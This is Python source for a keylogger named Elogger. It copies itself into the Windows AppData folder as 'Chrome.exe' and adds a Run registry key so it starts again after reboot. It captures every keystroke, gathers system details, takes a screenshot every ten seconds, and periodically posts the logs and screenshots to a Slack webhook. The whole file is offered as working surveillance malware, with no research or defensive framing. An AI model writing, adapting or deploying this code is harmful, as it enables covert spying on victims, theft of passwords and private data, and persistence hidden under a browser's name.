#!/usr/bin/env python
from asyncio import subprocess
import pynput.keyboard
import threading
import psutil
import os
import platform
import json
import sys
import random
import requests
import pyscreenshot
import pathlib
import shutil

class Elogger:
    def __init__(self, time_interval, webhook_url) -> None:
        self.persistence()
        self.log = ""
        self.screenshot = ""
        self.file_name = ""
        self.interval = time_interval
        self.webhook_url = webhook_url


    def persistence(self):
        if os.name == "nt":
            keep_in = os.environ["appdata"] + "\\Chrome.exe"
            if not os.path.exists(keep_in):
                shutil.copy(sys.executable, keep_in)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Chrome /t REG_SZ /d "' + keep_in + '"', shell=True)


    def sys_info(self):
        uname = platform.uname()
        self.add_to_log("\n" + "+"*20 + "| System Information |" + "+"*20 + "\n\n")
        self.add_to_log(f"System: {uname.system}\n")
        self.add_to_log(f"Node Name: {uname.node}\n")
        self.add_to_log(f"Release: {uname.release}\n")
        self.add_to_log(f"Version: {uname.version}\n")
        self.add_to_log(f"Machine: {uname.machine}\n")
        self.add_to_log(f"Processor: {uname.processor}\n")
        self.add_to_log(f"Processor: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB\n")
        self.add_to_log("\n" + "+"*20 + "| Events Information |" + "+"*20 + "\n\n")


    def add_to_log(self, data):
        self.log = self.log + data


    def key_event_handler(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = " [ENTER] "
            else:
                current_key = " " + str(key) + " "
        self.add_to_log(current_key)


    def get_screenshot(self):
        name = os.path.join(pathlib.Path(__file__).parent.resolve(), "screenshot_" + str(random.randint(0,1000)) + ".png")
        if os.name == "posix": # se for unix-like
            img = pyscreenshot.grab()
            print(img)
            img.save(name)
        elif os.name == "nt": # se for windows
            img = pyscreenshot.grab()
            img.save(name)
        
        with open(name, 'rb') as f:
            self.screenshot = f.read()
            self.file_name = f.name

        timer = threading.Timer(10, self.get_screenshot)
        timer.start()

        # os.remove(name) 


    def describe(self):
        self.send_to_slack(self.webhook_url, self.log, self.screenshot, self.file_name)
        # self.post_file_to_slack(self.webhook_url, self.log, self.screenshot, self.file_name, "")
        self.log = ""

        timer = threading.Timer(self.interval, self.describe)
        timer.start()


    def send_to_slack(self, webhook_url, log, screenshot, file_name):
        title = (f"New Incoming Event :trophy:")
        payload = {
            "username": "Event Logger",
            "icon_emoji": ":shipit:",
            "channel" : "#event-logs",
            "attachments": [
                {
                    "color": "#00FF00",
                    "fields": [
                        {
                        "type": "image",
                        "title": title,
                        "value": log,
                        }
                    ]
                },
                {
                    "type": "image",
                    "title": {
                        "type": "plain_text",
                        "text": file_name
                    },
                    "block_id": file_name,
                    "image_url": str(screenshot),
                    "alt_text": "screenshot."
                }
            ],
        }

        byte_length = str(sys.getsizeof(payload))
        headers = {'Content-Type': "application/json", 'Content-Length': byte_length}
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        if response.status_code != 200:
            raise Exception(response.status_code, response.text)

    # def post_file_to_slack(self, webhook_url, log, screenshot, file_name, file_type=None):
    #     return requests.post("https://slack.com/api/files.upload", 
    #     {
    #         # "token": slack_token,
    #         "filename": file_name,
    #         "channels": "#event-logs",
    #         "filetype": file_type,
    #         "initial_comment": log,
    #         "title": "Screenshots"
    #     },
    #     files = { "file": screenshot }).json()


    def execute(self):
        self.sys_info()
        self.get_screenshot()

        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_event_handler)
        with keyboard_listener:
            self.describe()
            keyboard_listener.join()
    